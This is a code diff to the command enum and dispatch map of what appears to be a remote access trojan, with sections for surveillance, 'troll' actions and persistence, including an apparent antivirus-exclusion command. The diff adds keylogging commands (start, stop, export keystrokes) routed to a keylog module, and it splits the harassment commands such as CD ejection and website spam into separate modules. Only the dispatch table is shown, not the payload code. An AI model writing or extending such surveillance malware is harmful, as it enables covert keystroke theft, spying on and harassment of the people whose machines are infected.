@@ -41,6 +41,10 @@ class Command(Enum):
 
     # Surveillance Commands
     SCREENSHOT = "SCREENSHOT"
+    START_KEYLOG = "START_KEYLOG"
+    STOP_KEYLOG = "STOP_KEYLOG"
+    EXPORT_KEYLOG_TEXT = "EXPORT_KEYLOG_TEXT"
+
     GET_AVAILABLE_DEVICES = "GET_AVAILABLE_DEVICES"
     START_CAMERA = "START_CAMERA"
 
@@ -107,6 +111,8 @@ class Command(Enum):
     STOP_CD_EJECTOR = "STOP_CD_EJECTOR"
     TYPE_MESSAGE_NOTEPAD = "TYPE_MESSAGE_NOTEPAD"
     SHOW_WEBSITE = "SHOW_WEBSITE"
+    START_WINDOW_TROLL = "START_WINDOW_TROLL"
+    STOP_WINDOW_TROLL = "STOP_WINDOW_TROLL"
 
     # Persistence Commands
     ADD_EXTENSION_EXCLUSION = "ADD_EXTENSION_EXCLUSION"
@@ -151,9 +157,13 @@ command_to_module_map = {
     Command.DISABLE_WINDOW_STATUS: "window",
 
     # Surveillance Commands
+    
     Command.SCREENSHOT: "visuals",
     Command.GET_AVAILABLE_DEVICES: "surveillance",
     Command.START_CAMERA: "surveillance",
+    Command.START_KEYLOG: "keylog",
+    Command.STOP_KEYLOG: "keylog",
+    Command.EXPORT_KEYLOG_TEXT: "keylog",
 
     # System Commands
     Command.CREATE_ACCOUNT: "accounts",
@@ -214,12 +224,15 @@ command_to_module_map = {
     Command.SHOW_MESSAGE_BOX: "troll",
     Command.RUN_TROLL_SCRIPT: "troll",
     Command.OPEN_CAMERA_APP: "troll",
+    Command.START_WINDOW_TROLL : "window_troll",
+    Command.STOP_WINDOW_TROLL : "window_troll",
     Command.CHANGE_WALLPAPER_HTTP: "troll",
-    Command.EJECT_CD: "troll",
-    Command.EJECT_CD_CONTINOUS: "troll",
-    Command.STOP_CD_EJECTOR: "troll",
-    Command.TYPE_MESSAGE_NOTEPAD: "troll",
-    Command.SHOW_WEBSITE: "troll",
+
+    Command.EJECT_CD: "cd",
+    Command.EJECT_CD_CONTINOUS: "cd",
+    Command.STOP_CD_EJECTOR: "cd",
+    Command.TYPE_MESSAGE_NOTEPAD: "type_message",
+    Command.SHOW_WEBSITE: "website_spam",
 
     # Persistence Commands
     Command.ADD_EXTENSION_EXCLUSION: "persistence",
